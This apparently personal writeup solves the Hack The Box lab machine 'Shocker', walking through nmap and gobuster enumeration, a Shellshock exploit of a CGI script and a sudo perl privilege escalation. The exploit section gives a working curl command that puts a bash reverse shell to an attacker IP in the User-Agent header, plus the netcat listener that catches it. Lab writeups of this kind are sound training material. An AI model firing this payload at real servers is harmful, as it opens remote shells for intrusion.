---
title: CTF Writeup - HTB Shocker
date: 2023-11-10 
author: kei5uke
description: Writeup for HTB Shocker
tags:
  - linux
  - writeup
---

# Shocker

# Enumeration

## Nmap

```bash
┌──(parallels㉿kali)-[~/shock]
└─$ nmap -sV -sC -p- 10.129.45.100 -T4 -oN nmap.txt
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 14:40 EET
Nmap scan report for 10.129.45.100
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.61 seconds
```

## SSH manual bruteforce

Tried to ssh as root with random passwords did not work.  

## Gobuster

```bash
┌──(parallels㉿kali)-[~/shock]
└─$ gobuster dir -u http://10.129.45.100/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.45.100/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/11/09 14:50:51 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 301]
Progress: 17762 / 17771 (99.95%)
===============================================================
2023/11/09 14:52:17 Finished
===============================================================
```

## Curl

```bash
┌──(parallels㉿kali)-[~/shock]
└─$ curl -X POST http://10.129.45.100                            
 <!DOCTYPE html>
<html>
<body>

<h2>Don't Bug Me!</h2>
<img src="bug.jpg" alt="bug" style="width:450px;height:350px;">

</body>
</html>
```

## Brute forcing cgi-bin

I couldn’t find anything useful.

Hint suggest that there’s script in cgi-bin directory.

```bash
┌──(root💀kali)-[/home/parallels/shock]
└─# gobuster dir -u http://10.129.86.205/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .sh   
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.86.205/cgi-bin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
2023/11/10 13:31:56 Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 119]
Progress: 2510 / 441122 (0.57%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/11/10 13:32:08 Finished
===============================================================
```

This can be used for exploit.

```bash
┌──(root💀kali)-[/home/parallels/shock]
└─# cat /home/parallels/Downloads/user.sh                                                                                1 ⨯
Content-Type: text/plain

Just an uptime test script

 06:33:54 up 55 min,  0 users,  load average: 0.00, 0.07, 0.07
```

# Exploit

## First shell

Payload

```bash
┌──(parallels㉿kali)-[~]
└─$ curl -H "User-agent: () { :;};  /bin/bash -i >& /dev/tcp/10.10.16.14/443 0>&1" http://10.129.86.205/cgi-bin/user.sh
```

I got the first shell.

```bash
┌──(root💀kali)-[/home/parallels/shock]
└─# nc -lvnp 443                                                                                                       
listening on [any] 443 ...
connect to [10.10.16.14] from (UNKNOWN) [10.129.86.205] 44984
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```

## Privilege Escalation

I got the root shell through Perl command.  

[perl| GTFOBins](https://gtfobins.github.io/gtfobins/perl/)

```bash
shelly@Shocker:/usr/lib/cgi-bin$ id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

# Root shell

![Screenshot 2023-11-10 at 13.54.42.png](Shocker%20d782eb0bc7694e299cccc05d6353b6a4/Screenshot_2023-11-10_at_13.54.42.png)

# Note
Gobuster can’t detect cgi-bin folder without -f option.
